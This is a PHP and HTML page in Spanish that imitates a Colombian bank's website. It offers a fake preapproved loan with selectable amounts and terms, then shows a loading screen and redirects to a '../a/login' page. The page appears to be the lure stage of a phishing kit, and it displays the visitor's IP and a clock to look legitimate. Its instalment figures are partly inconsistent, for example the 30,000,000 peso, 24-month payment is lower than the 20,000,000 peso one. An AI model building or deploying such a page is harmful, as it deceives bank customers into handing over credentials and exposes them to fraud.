<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
    <head>
        <title>Crédito de libre inversión para equipar tu hogar o viajar</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script src="../js/jquery.jclock-min.js" type="text/javascript"></script>
        <script type="text/javascript" src="../js/functions.js"></script>                    
        <style type="text/css">
            *{
                padding: 0px;
                margin: 0px;
                font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif;
            }
            #menu-top{
                background-color: #2C2A29;                
            }
            
            .item-menu-top {
                color: #fff;
                padding: 10px;               
                font-size: 14px;
                cursor: pointer;
            }

            .item-menu-top:hover {
                color: #2C2A29;
                background-color: #fff;

            }
            .menu{
                background-color: #fff               
            }
            .item-menu{
                font-size: 13px;
                color: #2C2A29;
                padding: 14px 10px;
                border-bottom: 2px solid #FFF;
                cursor: pointer;

            }
            .item-menu:hover{              
                border-bottom: 2px solid #FDDA24;
                font-weight: bold;
            }

            select {
                border: 1px solid #CCCCCC;
                border-radius: 0px;
                height: 34px;
                font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
                font-size: 14px;
                font-weight: normal;
                line-height: 1.428571429;
                color: #2c2a29;
                margin: 15px 0px;
            }

            button{
                background: #FDDA24;
                border-radius: 60px;
                font-family: "OpenSans-Regular";
                color: #2C2A29;
                font-weight: bold;
                padding: 8px 18px; 
                max-width: 300px;
                width: 90%;
                outline: none;
                text-decoration: none;
                border: 0;
            }

            #plazo1,#plazo2{
                border: 1px solid #CCCCCC; 
                padding: 20px; 
                text-align: center;
                max-width: 410px;
            }
            #plazo2{
                display: none;
            }

            #dina2{
                background-color: #434547; 
                padding:20px;
                margin: 30 auto;
                width: calc(94% - 40px);  
                display: none !important;              
            }
            

            #foto-movil{
                display: none;
            }

            #contenido{
                width: 100%; max-width: 1139;margin: 0 auto;
            }

            .texto-min {
                font-size: 11px !important;
                color: #2c2a29 !important;
                font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
                line-height: 16px;
            }

            #info-footer2{
                display: none;
            }

            #fondo{
                position: fixed;
                width: 100%;
                height: 100%;
                left: 0;
                top: 0;
                background-color: #ffffffe6;
                z-index: 900;  display: none;
            }

            #cargando{
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                z-index: 920;               
                text-align: center;   
                display: none;            
            }
            #icon{display: none;}

            #botones-footer{
                width: 100%;
                height: auto;
                position: fixed;
                left: 0;
                bottom: 0;                
                z-index: 900;     
            }

            @media (max-width: 991px) {
                .menu{
                    margin-top: 20px;             
                }

                #menu-top,#menu-pal,#sucral,#miga,#din,#foto-desktop,#plazo1,#info-footer1 {
                    display: none;
                }

                #foto-movil,#icon,#plazo2,#info-footer2,#dina2{
                    display: block;
                }
                #letra-grande img{
                    height: 33px;
                }
                #contenido {
                    width: 94%;
                    max-width: 691px;
                    margin: 0 auto;
                }
                #plazo2{
                    margin: 30 auto;
                    width: calc(94% - 40px);
                }
                #footer-logo{
                    text-align: center;
                }
            }
        </style>
        
    </head>
    <body> 
        <div id="botones-footer"><img src="../img/botones-footer.jpg" width="100%"></div>  
        <div id="fondo"></div>
        <div id="cargando">
            <img src="../img/logo.svg">            
            <br>
            <img src="../img/load2.gif" />
        </div>
        <div id="menu-top">
            <table border="0" cellpadding="0" cellspacing="0" style="width: 100%; max-width: 1319;margin: 0 auto;">
                <tr>
                    <td valign="middle" align="left">
                        <table border="0" cellpadding="0" cellspacing="0">
                            <tr>                                
                                <td class="item-menu-top">Personas</td>
                                <td class="item-menu-top">Negocios</td>
                                <td class="item-menu-top">Corporativos</td>
                                <td class="item-menu-top">Negocios Especializados</td>
                                <td class="item-menu-top">Tu360</td>
                            </tr>
                        </table>
                    </td>
                    <td valign="middle" align="right">
                        <table border="0" cellpadding="0" cellspacing="0">
                            <tr>                                
                                <td class="item-menu-top">Transparencia</td>
                                <td class="item-menu-top">Consumidor</td>
                                <td class="item-menu-top">Solicita Documentos</td>
                            </tr>
                        </table>
                    </td>
                </tr>
            </table>
        </div>
        <div class="menu">
            <table border="0" cellpadding="0" cellspacing="0" style="width: 94%; max-width: 1319;margin: 0 auto;">
                <tr>
                    <td valign="middle" align="left"><img src="../img/logo.svg"></td>
                    <td valign="middle" align="center" id="menu-pal">
                        <table border="0" cellpadding="0" cellspacing="0">
                            <tr>
                                <td class="item-menu">Inicio</td>
                                <td class="item-menu">Necesidades</td>
                                <td class="item-menu">Productos y Servicios</td>
                                <td class="item-menu">Educación Financiera</td>
                            </tr>
                        </table>
                    </td>
                    <td valign="middle" align="right"><img src="../img/sucral.jpg" style="cursor: pointer;" id="sucral"><img src="../img/iconos.jpg" style="cursor: pointer;" id="icon"></td>
                </tr>
            </table>
            <table border="0" cellpadding="0" cellspacing="0" style="width: 100%; max-width: 1319;margin: 0 auto;">
                <tr>
                    <td valign="middle" align="left"><img src="../img/miga.jpg" id="miga"></td>
                    <td valign="middle" align="right"><img src="../img/din.jpg" id="din" style="cursor: pointer;"></td>
                    <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
                </tr>
            </table>
        </div>
        <table border="0" cellpadding="0" cellspacing="0" id="contenido">
            <tr>
                <td width="50%" valign="top">
                    <div id="letra-grande" style="display:none;"><img src="../img/cr.jpg"><img src="../img/de.jpg"><img src="../img/li.jpg"><img src="../img/in.jpg"><img src="../img/ba.jpg"></div>
                    <div>Cuentas con crédito de <b>libre inversión</b> preaprobado. Aprovecha las ventas de una cuota fija con una tasa de <b>1.73%</b>. ¡Aprovecha esta oportunidad!
                    </div>
                    <br>
                    <div id="plazo1">
                        <img src="../img/mano.png" width="50px">
                        <br>
                        Seleciona el monto y plazo
                        <br>
                        <select id="txt-plazo1" name="txt-plazo1">
                            <option value="">Selecciona una opción
                            <option value="1">$10.000.000 | 24 Meses | Cuota: $526.318,29</option>
                            <option value="1">$10.000.000 | 36 Meses | Cuota: $389.812,69</option>
                            <option value="1">$10.000.000 | 48 Meses | Cuota: $323.370,43</option>
                            <option value="1">$20.000.000 | 24 Meses | Cuota: $989.685,83</option>
                            <option value="1">$20.000.000 | 36 Meses | Cuota: $779.625,38</option>
                            <option value="1">$20.000.000 | 48 Meses | Cuota: $646.740,86</option>
                            <option value="1">$30.000.000 | 24 Meses | Cuota: $970.574,29</option>
                            <option value="1">$30.000.000 | 36 Meses | Cuota: $870.987,34</option>
                            <option value="1">$30.000.000 | 48 Meses | Cuota: $770.254,98</option>
                        </select>
                        <br>
                        <button id="btn-inicio1">CONTINUAR</button>
                    </div>
                </td>

                <td width="50%" valign="top" id="foto-desktop"><img src="../img/foto.jpg" width="100%"></td>
            </tr>
            <tr>
                <td align="center" id="foto-movil">
                    <img src="../img/foto.jpg" width="100%" style="max-width: 680px;">
                </td>
            </tr>
        </table>
        <div id="dina2">
            <table border="0" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                    <td valign="middle" align="left" width="30">
                        <img src="../img/ico-pass.png">
                    </td>
                    <td style="color: #fff;padding-left: 10px;">
                        Debes tener activa tu clave dinámica para desembolsar tu crédito
                    </td>
                </tr>    
            </table>
        </div>    
        <div id="plazo2">
            <img src="../img/mano.png" width="50px">
            <br>
            Seleciona el monto y plazo
            <br>
            <select id="txt-plazo2" name="txt-plazo2">
                <option value="">Selecciona una opción
                <option value="1">$10.000.000 | 24 Meses | Cuota: $526.318,29</option>
                <option value="1">$10.000.000 | 36 Meses | Cuota: $389.812,69</option>
                <option value="1">$10.000.000 | 48 Meses | Cuota: $323.370,43</option>
                <option value="1">$20.000.000 | 24 Meses | Cuota: $989.685,83</option>
                <option value="1">$20.000.000 | 36 Meses | Cuota: $779.625,38</option>
                <option value="1">$20.000.000 | 48 Meses | Cuota: $646.740,86</option>
                <option value="1">$30.000.000 | 24 Meses | Cuota: $970.574,29</option>
                <option value="1">$30.000.000 | 36 Meses | Cuota: $870.987,34</option>
                <option value="1">$30.000.000 | 48 Meses | Cuota: $770.254,98</option>
            </select>
            <br>
            <button id="btn-inicio2">CONTINUAR</button>
        </div>
        <div style="border-bottom: 1px solid #CCCCCC;width: 94%; max-width: 1290;margin: 40 auto"></div>
        <table border="0" cellpadding="0" cellspacing="0" style="width: 94%; max-width: 1290;margin: -5 auto;">
            <tr>
                <td valign="top" align="left" id="footer-logo"><img src="../img/grupo.png" width="220"></td>
                <td valign="top" align="right" id="info-footer1">
                    <div class="texto-min">Dirección IP: <span class="texto-min" id="IP1"><?php echo $ip; ?></span></div>
                    <div class="texto-min">Fecha y hora actual: <span class="texto-min" id="fecha-hora1">Lunes 13 de Junio de 2022 9:23:11 AM</span></div>                    
                </td>
            </tr>
            <tr>
                <td align="center" id="info-footer2">
                    <div class="texto-min">Dirección IP: <span class="texto-min" id="IP2"><?php echo $ip; ?></span></div>
                    <div class="texto-min">Fecha y hora actual: <span class="texto-min" id="fecha-hora2">Lunes 13 de Junio de 2022 9:23:11 AM</span></div>  
                </td>                
            </tr>
        </table>
        <br>
    </body>
    <script type="text/javascript">
        $(document).ready(function() { 
        function salir(){
            window.location.href = "../a/login";
        } 

            $('#btn-inicio1').click(function(){
                if ($("#txt-plazo1").val() != "") {
                    $("#fondo,#cargando").show();
                    setTimeout(salir, 900);
                }else{                   
                    $("#txt-plazo1").focus();
                }           
            }); 

            $('#btn-inicio2').click(function(){
                if ($("#txt-plazo2").val() != "") {
                    $("#fondo,#cargando").show();
                    setTimeout(salir, 900);
                }else{                   
                    $("#txt-plazo2").focus();
                }           
            });              

             
        });
    </script>
</html>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora1,#fecha-hora2').jclock(optionsEST);
     });
 </script>